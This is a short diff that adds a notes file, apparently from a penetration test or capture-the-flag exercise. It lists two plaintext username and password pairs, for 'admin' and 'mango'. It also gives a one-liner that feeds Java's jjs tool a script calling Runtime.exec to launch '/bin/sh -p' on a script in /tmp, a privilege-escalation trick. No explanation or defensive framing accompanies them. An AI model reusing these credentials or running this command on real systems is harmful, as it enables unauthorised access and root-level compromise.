@@ -1,0 +1,7 @@
+admin:t9KcS3>!0B#2
+mango:h3mXK8RhU~f{]f5H
+
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -p /tmp/test.sh').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+
+
